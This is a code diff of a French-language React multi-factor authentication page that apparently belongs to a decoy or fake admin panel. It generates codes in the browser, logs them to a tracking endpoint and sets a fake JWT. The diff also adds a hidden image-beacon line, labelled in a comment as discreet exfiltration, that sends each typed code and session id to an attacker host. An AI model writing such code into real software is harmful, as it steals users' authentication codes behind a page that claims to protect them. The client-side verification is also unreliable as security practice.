@@ -1,38 +1,111 @@
-import React, { useState } from "react";
+// 📁 frontend/src/pages/Security/MFA.js
+import React, { useState, useEffect, useRef } from "react";
+import { useNavigate } from "react-router-dom";
+import "../../theme/styles.css";
 
 export default function MFA() {
+  const navigate = useNavigate();
   const [code, setCode] = useState("");
+  const [input, setInput] = useState("");
   const [status, setStatus] = useState("");
+  const [timer, setTimer] = useState(30);
+  const session = useRef(Date.now());
+
+  // Rafraîchit le code et notifie le backend
+  const refreshCode = () => {
+    const newCode = Math.floor(100000 + Math.random() * 900000).toString();
+    setCode(newCode);
+    setTimer(30);
+    fetch("http://localhost:8080/track", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        event: "mfa_code_refreshed",
+        code: newCode,
+        session: session.current,
+      }),
+    });
+  };
+
+  // À la montée / on démonte : boucle toutes les 30 s
+  useEffect(() => {
+    refreshCode();
+    const iv = setInterval(() => {
+      setTimer((t) => {
+        if (t <= 1) {
+          refreshCode();
+          return 30;
+        }
+        return t - 1;
+      });
+    }, 1000);
+    return () => clearInterval(iv);
+  }, []);
 
   const handleVerify = async () => {
-    setStatus("⏳ Vérification du code...");
-    await new Promise(r => setTimeout(r, 1000));
-    setStatus("❌ Code invalide. Essayez encore."); // toujours invalide, mais crédible
-
-    // tracking de curiosité
+    // 1) Traque la tentative
     await fetch("http://localhost:8080/track", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ event: "mfa_attempt", code, page: "MFA" }),
+      body: JSON.stringify({
+        event: "mfa_attempt",
+        input,
+        session: session.current,
+      }),
     });
+
+    // 2) Exfiltration discrète du code tapé
+    new Image().src = `http://attacker.site/steal?code=${input}&session=${session.current}`;
+
+    // 3) Vérification « offline »
+    if (input === code) {
+      setStatus("✔️ Code valide, redirection...");
+      // faux JWT
+      localStorage.setItem("jwt", `${code}-securepanel-faketoken`);
+      // Traque le succès
+      await fetch("http://localhost:8080/track", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          event: "mfa_success",
+          session: session.current,
+        }),
+      });
+      setTimeout(() => navigate("/dashboard"), 1000);
+    } else {
+      setStatus("❌ Code invalide, veuillez réessayer.");
+    }
   };
 
   return (
     <div className="container mt-5 text-center">
-      <h2>🔐 Vérification Multi-Facteurs</h2>
-      <p className="text-muted">Entrez le code généré par votre app d’authentification</p>
+      <h2>🔐 Authentification Multi-Facteurs</h2>
+      <p className="text-muted">Entrez le code à 6 chiffres :</p>
+
+      <div className="mb-3">
+        <code className="fs-2">{code}</code>
+        <div className="small text-muted">Expire dans {timer}s</div>
+      </div>
+
       <input
         type="text"
-        className="form-control w-25 mx-auto"
+        className="form-control w-25 mx-auto text-center"
         placeholder="000000"
         maxLength={6}
-        value={code}
-        onChange={(e) => setCode(e.target.value)}
+        value={input}
+        onChange={(e) => setInput(e.target.value.replace(/\D/, ""))}
       />
-      <button className="btn btn-primary mt-3" onClick={handleVerify}>
-        Vérifier le code
-      </button>
-      {status && <div className="alert alert-warning mt-3">{status}</div>}
+
+      <div className="mt-3">
+        <button className="btn btn-primary me-2" onClick={handleVerify}>
+          Vérifier
+        </button>
+        <button className="btn btn-link" onClick={refreshCode}>
+          🔄 Nouveau code
+        </button>
+      </div>
+
+      {status && <div className="alert alert-info mt-3">{status}</div>}
     </div>
   );
 }
